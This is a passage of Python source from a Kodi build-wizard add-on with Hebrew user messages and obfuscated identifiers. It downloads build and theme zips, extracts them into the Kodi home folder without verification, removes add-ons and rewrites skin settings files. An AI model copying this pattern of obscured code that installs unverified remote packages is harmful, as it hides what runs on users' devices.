		OOO0O0OO00000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3880
		try :#line:3881
			O00OO00O0OOO0OOOO =open (OOO0O0OO00000OOO0 ,'r')#line:3882
			O000O00OOOO000O0O =O00OO00O0OOO0OOOO .read ()#line:3883
			O00OO00O0OOO0OOOO .close ()#line:3884
			OO000O000O0O00OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3885
			OOO0OOOOO0OOO0O0O =re .compile (OO000O000O0O00OO0 ).findall (O000O00OOOO000O0O )[0 ]#line:3886
			O00OO00O0OOO0OOOO =open (OOO0O0OO00000OOO0 ,'w')#line:3887
			O00OO00O0OOO0OOOO .write (O000O00OOOO000O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOO0OOOOO0OOO0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3888
			O00OO00O0OOO0OOOO .close ()#line:3889
		except :#line:3890
				pass #line:3891
		swapSkins ('skin.Premium.mod')#line:3892
def buildWizard (O00OO0OO0OOOO000O ,O0OO000OO0OOO0OOO ,theme =None ,over =False ):#line:3895
	if over ==False :#line:3896
		O000O0O00OOO00OOO =wiz .checkBuild (O00OO0OO0OOOO000O ,'url')#line:3897
		if O000O0O00OOO00OOO ==False :#line:3899
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3904
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3905
			return #line:3906
		OO000O0O0OO00O00O =wiz .workingURL (O000O0O00OOO00OOO )#line:3907
		if OO000O0O0OO00O00O ==False :#line:3908
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO000O0O0OO00O00O ))#line:3909
			return #line:3910
	if O0OO000OO0OOO0OOO =='gui':#line:3911
		if O00OO0OO0OOOO000O ==BUILDNAME :#line:3912
			if over ==True :O0O0O0OOOO000O00O =1 #line:3913
			else :O0O0O0OOOO000O00O =1 #line:3914
		else :#line:3915
			O0O0O0OOOO000O00O =1 #line:3916
		if O0O0O0OOOO000O00O :#line:3917
			remove_addons ()#line:3918
			remove_addons2 ()#line:3919
			O00OOO0O0OOOO0000 =wiz .checkBuild (O00OO0OO0OOOO000O ,'gui')#line:3920
			O0OO00O0OOOOO00O0 =O00OO0OO0OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3921
			if not wiz .workingURL (O00OOO0O0OOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3922
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3923
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ),'','אנא המתן')#line:3924
			OOO000OOOO000O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00O0OOOOO00O0 )#line:3925
			try :os .remove (OOO000OOOO000O0O0 )#line:3926
			except :pass #line:3927
			logging .warning (O00OOO0O0OOOO0000 )#line:3928
			if 'google'in O00OOO0O0OOOO0000 :#line:3929
			   OO0O000OOOO000OOO =googledrive_download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP ,wiz .checkBuild (O00OO0OO0OOOO000O ,'filesize'))#line:3930
			else :#line:3933
			  downloader .download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP )#line:3934
			xbmc .sleep (100 )#line:3935
			OO0OO0OOOO0O0OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O )#line:3936
			DP .update (0 ,OO0OO0OOOO0O0OOOO ,'','אנא המתן')#line:3937
			extract .all (OOO000OOOO000O0O0 ,HOME ,DP ,title =OO0OO0OOOO0O0OOOO )#line:3938
			DP .close ()#line:3939
			wiz .defaultSkin ()#line:3940
			wiz .lookandFeelData ('save')#line:3941
			wiz .kodi17Fix ()#line:3942
			if KODIV >=18 :#line:3943
				skindialogsettind18 ()#line:3944
			xbmc .executebuiltin ("ReloadSkin()")#line:3945
			if INSTALLMETHOD ==1 :OO0OO00O000OOO0OO =1 #line:3946
			elif INSTALLMETHOD ==2 :OO0OO00O000OOO0OO =0 #line:3947
			else :DP .close ()#line:3948
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3949
			update_Votes ()#line:3950
			indicatorfastupdate ()#line:3951
		else :#line:3953
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3954
	if O0OO000OO0OOO0OOO =='gui2':#line:3955
		if O00OO0OO0OOOO000O ==BUILDNAME :#line:3956
			if over ==True :O0O0O0OOOO000O00O =1 #line:3957
			else :O0O0O0OOOO000O00O =1 #line:3958
		else :#line:3959
			O0O0O0OOOO000O00O =1 #line:3960
		if O0O0O0OOOO000O00O :#line:3961
			remove_addons ()#line:3962
			remove_addons2 ()#line:3963
			O00OOO0O0OOOO0000 =wiz .checkBuild (O00OO0OO0OOOO000O ,'gui')#line:3964
			O0OO00O0OOOOO00O0 =O00OO0OO0OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3965
			if not wiz .workingURL (O00OOO0O0OOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3966
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3967
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ),'','אנא המתן')#line:3968
			OOO000OOOO000O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00O0OOOOO00O0 )#line:3969
			try :os .remove (OOO000OOOO000O0O0 )#line:3970
			except :pass #line:3971
			logging .warning (O00OOO0O0OOOO0000 )#line:3972
			if 'google'in O00OOO0O0OOOO0000 :#line:3973
			   OO0O000OOOO000OOO =googledrive_download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP ,wiz .checkBuild (O00OO0OO0OOOO000O ,'filesize'))#line:3974
			else :#line:3977
			  downloader .download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP )#line:3978
			xbmc .sleep (100 )#line:3979
			OO0OO0OOOO0O0OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O )#line:3980
			DP .update (0 ,OO0OO0OOOO0O0OOOO ,'','אנא המתן')#line:3981
			extract .all (OOO000OOOO000O0O0 ,HOME ,DP ,title =OO0OO0OOOO0O0OOOO )#line:3982
			DP .close ()#line:3983
			wiz .defaultSkin ()#line:3984
			wiz .lookandFeelData ('save')#line:3985
			if INSTALLMETHOD ==1 :OO0OO00O000OOO0OO =1 #line:3988
			elif INSTALLMETHOD ==2 :OO0OO00O000OOO0OO =0 #line:3989
			else :DP .close ()#line:3990
		else :#line:3992
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3993
	elif O0OO000OO0OOO0OOO =='fresh':#line:3994
		freshStart (O00OO0OO0OOOO000O )#line:3995
	elif O0OO000OO0OOO0OOO =='normal':#line:3996
		if url =='normal':#line:3997
			if KEEPTRAKT =='true':#line:3998
				traktit .autoUpdate ('all')#line:3999
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4000
			if KEEPREAL =='true':#line:4001
				debridit .autoUpdate ('all')#line:4002
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4003
			if KEEPLOGIN =='true':#line:4004
				loginit .autoUpdate ('all')#line:4005
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4006
		O0O00O0O00O0000OO =int (KODIV );OO000O00OOOOO0OO0 =int (float (wiz .checkBuild (O00OO0OO0OOOO000O ,'kodi')))#line:4007
		if not O0O00O0O00O0000OO ==OO000O00OOOOO0OO0 :#line:4008
			if O0O00O0O00O0000OO ==16 and OO000O00OOOOO0OO0 <=15 :O00O00OO000O0O0O0 =False #line:4009
			else :O00O00OO000O0O0O0 =True #line:4010
		else :O00O00OO000O0O0O0 =False #line:4011
		if O00O00OO000O0O0O0 ==True :#line:4012
			OO0O0OO0OOOO0OOOO =1 #line:4013
		else :#line:4014
			if not over ==False :OO0O0OO0OOOO0OOOO =1 #line:4015
			else :OO0O0OO0OOOO0OOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4016
		if OO0O0OO0OOOO0OOOO :#line:4017
			wiz .clearS ('build')#line:4018
			O00OOO0O0OOOO0000 =wiz .checkBuild (O00OO0OO0OOOO000O ,'url')#line:4019
			O0OO00O0OOOOO00O0 =O00OO0OO0OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4020
			if not wiz .workingURL (O00OOO0O0OOOO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4021
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4022
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ,wiz .checkBuild (O00OO0OO0OOOO000O ,'version')),'','אנא המתן')#line:4023
			OOO000OOOO000O0O0 =os .path .join (PACKAGES ,'%s.zip'%O0OO00O0OOOOO00O0 )#line:4024
			try :os .remove (OOO000OOOO000O0O0 )#line:4025
			except :pass #line:4026
			logging .warning (O00OOO0O0OOOO0000 )#line:4027
			if 'google'in O00OOO0O0OOOO0000 :#line:4028
			   OO0O000OOOO000OOO =googledrive_download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP ,wiz .checkBuild (O00OO0OO0OOOO000O ,'filesize'))#line:4029
			else :#line:4032
			  downloader .download (O00OOO0O0OOOO0000 ,OOO000OOOO000O0O0 ,DP )#line:4033
			xbmc .sleep (1000 )#line:4034
			OO0OO0OOOO0O0OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ,wiz .checkBuild (O00OO0OO0OOOO000O ,'version'))#line:4035
			DP .update (0 ,OO0OO0OOOO0O0OOOO ,'','Please Wait')#line:4036
			O0O00O0OOO00OO0OO ,O0O0000000000OO00 ,OO0O0O0O0O0OOO000 =extract .all (OOO000OOOO000O0O0 ,HOME ,DP ,title =OO0OO0OOOO0O0OOOO )#line:4037
			if int (float (O0O00O0OOO00OO0OO ))>0 :#line:4038
				try :#line:4039
					wiz .fixmetas ()#line:4040
				except :pass #line:4041
				wiz .lookandFeelData ('save')#line:4042
				wiz .defaultSkin ()#line:4043
				wiz .setS ('buildname',O00OO0OO0OOOO000O )#line:4045
				wiz .setS ('buildversion',wiz .checkBuild (O00OO0OO0OOOO000O ,'version'))#line:4046
				wiz .setS ('buildtheme','')#line:4047
				wiz .setS ('latestversion',wiz .checkBuild (O00OO0OO0OOOO000O ,'version'))#line:4048
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4049
				wiz .setS ('installed','true')#line:4050
				wiz .setS ('extract',str (O0O00O0OOO00OO0OO ))#line:4051
				wiz .setS ('errors',str (O0O0000000000OO00 ))#line:4052
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O00O0OOO00OO0OO ,O0O0000000000OO00 ))#line:4053
				fastupdatefirstbuild (NOTEID )#line:4054
				wiz .kodi17Fix ()#line:4055
				skin_homeselect ()#line:4056
				skin_lower ()#line:4057
				rdbuildinstall ()#line:4058
				try :gaiaserenaddon ()#line:4059
				except :pass #line:4060
				adults18 ()#line:4061
				skinfix18 ()#line:4062
				try :os .remove (OOO000OOOO000O0O0 )#line:4064
				except :pass #line:4065
				O0OO00O00OO00O00O =(ADDON .getSetting ("auto_rd"))#line:4066
				if O0OO00O00OO00O00O =='true':#line:4067
					try :#line:4068
						setautorealdebrid ()#line:4069
					except :pass #line:4070
				try :#line:4071
					autotrakt ()#line:4072
				except :pass #line:4073
				O00O00000O0OO00OO =(ADDON .getSetting ("imdb_on"))#line:4074
				if O00O00000O0OO00OO =='true':#line:4075
					imdb_synck ()#line:4076
				iptvset ()#line:4077
				if int (float (O0O0000000000OO00 ))>0 :#line:4079
					O0O0O0OOOO000O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ,wiz .checkBuild (O00OO0OO0OOOO000O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O00O0OOO00OO0OO ,'%',COLOR1 ,O0O0000000000OO00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4080
					if O0O0O0OOOO000O00O :#line:4081
						if isinstance (O0O0000000000OO00 ,unicode ):#line:4082
							OO0O0O0O0O0OOO000 =OO0O0O0O0O0OOO000 .encode ('utf-8')#line:4083
						wiz .TextBox (ADDONTITLE ,OO0O0O0O0O0OOO000 )#line:4084
				DP .close ()#line:4085
				O0O000000OO000OO0 =wiz .themeCount (O00OO0OO0OOOO000O )#line:4086
				builde_Votes ()#line:4087
				indicator ()#line:4088
				if not O0O000000OO000OO0 ==False :#line:4089
					buildWizard (O00OO0OO0OOOO000O ,'theme')#line:4090
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4091
				if INSTALLMETHOD ==1 :OO0OO00O000OOO0OO =1 #line:4092
				elif INSTALLMETHOD ==2 :OO0OO00O000OOO0OO =0 #line:4093
				else :resetkodi ()#line:4094
				if OO0OO00O000OOO0OO ==1 :wiz .reloadFix ()#line:4096
				else :wiz .killxbmc (True )#line:4097
			else :#line:4098
				if isinstance (O0O0000000000OO00 ,unicode ):#line:4099
					OO0O0O0O0O0OOO000 =OO0O0O0O0O0OOO000 .encode ('utf-8')#line:4100
				OOOO0O0O0OO0OOOOO =open (OOO000OOOO000O0O0 ,'r')#line:4101
				OOOO00000OOO0OO00 =OOOO0O0O0OO0OOOOO .read ()#line:4102
				OO00O000OOO0OOO0O =''#line:4103
				for OOOO0OO0O0OOOO00O in OO0O000OOOO000OOO :#line:4104
				  OO00O000OOO0OOO0O ='key: '+OO00O000OOO0OOO0O +'\n'+OOOO0OO0O0OOOO00O #line:4105
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0O0O0O0OOO000 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00O000OOO0OOO0O )#line:4106
		else :#line:4107
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4108
	elif O0OO000OO0OOO0OOO =='theme':#line:4109
		if theme ==None :#line:4110
			O0O000000OO000OO0 =wiz .checkBuild (O00OO0OO0OOOO000O ,'theme')#line:4111
			O0OOO0000OOOOO00O =[]#line:4112
			if not O0O000000OO000OO0 =='http://'and wiz .workingURL (O0O000000OO000OO0 )==True :#line:4113
				O0OOO0000OOOOO00O =wiz .themeCount (O00OO0OO0OOOO000O ,False )#line:4114
				if len (O0OOO0000OOOOO00O )>0 :#line:4115
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00OO0OO0OOOO000O ,COLOR1 ,len (O0OOO0000OOOOO00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4116
						wiz .log ("Theme List: %s "%str (O0OOO0000OOOOO00O ))#line:4117
						OOO0OO0O00OOOOO00 =DIALOG .select (ADDONTITLE ,O0OOO0000OOOOO00O )#line:4118
						wiz .log ("Theme install selected: %s"%OOO0OO0O00OOOOO00 )#line:4119
						if not OOO0OO0O00OOOOO00 ==-1 :theme =O0OOO0000OOOOO00O [OOO0OO0O00OOOOO00 ];OO0OO00O00OO00OO0 =True #line:4120
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4121
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4122
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4123
		else :OO0OO00O00OO00OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00OO0OO0OOOO000O ,wiz .checkBuild (O00OO0OO0OOOO000O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4124
		if OO0OO00O00OO00OO0 :#line:4125
			OO0OO0OOO00OOO0OO =wiz .checkTheme (O00OO0OO0OOOO000O ,theme ,'url')#line:4126
			O0OO00O0OOOOO00O0 =O00OO0OO0OOOO000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4127
			if not wiz .workingURL (OO0OO0OOO00OOO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4128
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4129
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4130
			OOO000OOOO000O0O0 =os .path .join (PACKAGES ,'%s.zip'%O0OO00O0OOOOO00O0 )#line:4131
			try :os .remove (OOO000OOOO000O0O0 )#line:4132
			except :pass #line:4133
			downloader .download (OO0OO0OOO00OOO0OO ,OOO000OOOO000O0O0 ,DP )#line:4134
			xbmc .sleep (1000 )#line:4135
			DP .update (0 ,"","Installing %s "%O00OO0OO0OOOO000O )#line:4136
			O0O0O00000OOOO0O0 =False #line:4137
			if url not in ["fresh","normal"]:#line:4138
				O0O0O00000OOOO0O0 =testTheme (OOO000OOOO000O0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4139
				O0O00OO0OO0OOOO0O =testGui (OOO000OOOO000O0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4140
				if O0O0O00000OOOO0O0 ==True :#line:4141
					wiz .lookandFeelData ('save')#line:4142
					OOO0O0O0O00OO0OOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4143
					O000OO0OOO0O00O00 =xbmc .getSkinDir ()#line:4144
					skinSwitch .swapSkins (OOO0O0O0O00OO0OOO )#line:4146
					O00OO00OO00O0OOO0 =0 #line:4147
					xbmc .sleep (1000 )#line:4148
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00OO00O0OOO0 <150 :#line:4149
						O00OO00OO00O0OOO0 +=1 #line:4150
						xbmc .sleep (1000 )#line:4151
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4152
						wiz .ebi ('SendClick(11)')#line:4153
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4154
					xbmc .sleep (1000 )#line:4155
			OO0OO0OOOO0O0OOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4156
			DP .update (0 ,OO0OO0OOOO0O0OOOO ,'','אנא המתן')#line:4157
			O0O00O0OOO00OO0OO ,O0O0000000000OO00 ,OO0O0O0O0O0OOO000 =extract .all (OOO000OOOO000O0O0 ,HOME ,DP ,title =OO0OO0OOOO0O0OOOO )#line:4158
			wiz .setS ('buildtheme',theme )#line:4159
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O00O0OOO00OO0OO ,O0O0000000000OO00 ))#line:4160
			DP .close ()#line:4161
			if url not in ["fresh","normal"]:#line:4162
				wiz .forceUpdate ()#line:4163
				if KODIV >=17 :wiz .kodi17Fix ()#line:4164
				if O0O00OO0OO0OOOO0O ==True :#line:4165
					wiz .lookandFeelData ('save')#line:4166
					wiz .defaultSkin ()#line:4167
					O000OO0OOO0O00O00 =wiz .getS ('defaultskin')#line:4168
					skinSwitch .swapSkins (O000OO0OOO0O00O00 )#line:4169
					O00OO00OO00O0OOO0 =0 #line:4170
					xbmc .sleep (1000 )#line:4171
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00OO00O0OOO0 <150 :#line:4172
						O00OO00OO00O0OOO0 +=1 #line:4173
						xbmc .sleep (1000 )#line:4174
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4176
						wiz .ebi ('SendClick(11)')#line:4177
					wiz .lookandFeelData ('restore')#line:4178
				elif O0O0O00000OOOO0O0 ==True :#line:4179
					skinSwitch .swapSkins (O000OO0OOO0O00O00 )#line:4180
					O00OO00OO00O0OOO0 =0 #line:4181
					xbmc .sleep (1000 )#line:4182
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00OO00O0OOO0 <150 :#line:4183
						O00OO00OO00O0OOO0 +=1 #line:4184
						xbmc .sleep (1000 )#line:4185
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4187
						wiz .ebi ('SendClick(11)')#line:4188
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4189
					wiz .lookandFeelData ('restore')#line:4190
				else :#line:4191
					wiz .ebi ("ReloadSkin()")#line:4192
					xbmc .sleep (1000 )#line:4193
					wiz .ebi ("Container.Refresh")#line:4194
		else :#line:4195
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4196
def skin_homeselect ():#line:4200
	try :#line:4202
		O00O0OO000O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4203
		O00000OO0O00000OO =open (O00O0OO000O000000 ,'r')#line:4205
		OO0OO0OOO0O0O00OO =O00000OO0O00000OO .read ()#line:4206
		O00000OO0O00000OO .close ()#line:4207
		OOOOOO00OOO000OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4208
		OO0O0O0O0O0OOOOO0 =re .compile (OOOOOO00OOO000OOO ).findall (OO0OO0OOO0O0O00OO )[0 ]#line:4209
		O00000OO0O00000OO =open (O00O0OO000O000000 ,'w')#line:4210
		O00000OO0O00000OO .write (OO0OO0OOO0O0O00OO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O0O0O0O0OOOOO0 ,'<setting id="HomeS" type="string"></setting>'))#line:4211
		O00000OO0O00000OO .close ()#line:4212
	except :#line:4213
		pass #line:4214
def skin_lower ():#line:4217
	O0000O0000000O0OO =(ADDON .getSetting ("lower"))#line:4218
	if O0000O0000000O0OO =='true':#line:4219
		try :#line:4222
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4223
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4225
			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4226
			O00O00OOO0OOOOO00 .close ()#line:4227
			OOO000O0000O000OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4228
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4229
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4230
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4231
			O00O00OOO0OOOOO00 .close ()#line:4232
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4234
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4236
			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4237
			O00O00OOO0OOOOO00 .close ()#line:4238
			OOO000O0000O000OO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4239
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4240
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4241
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4242
			O00O00OOO0OOOOO00 .close ()#line:4243
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4245
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4247
			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4248
			O00O00OOO0OOOOO00 .close ()#line:4249
			OOO000O0000O000OO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4250
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4251
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4252
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4253
			O00O00OOO0OOOOO00 .close ()#line:4254
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4260
			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4261
			O00O00OOO0OOOOO00 .close ()#line:4262
			OOO000O0000O000OO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4263
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4264
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4265
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4266
			O00O00OOO0OOOOO00 .close ()#line:4267
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4271
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4273
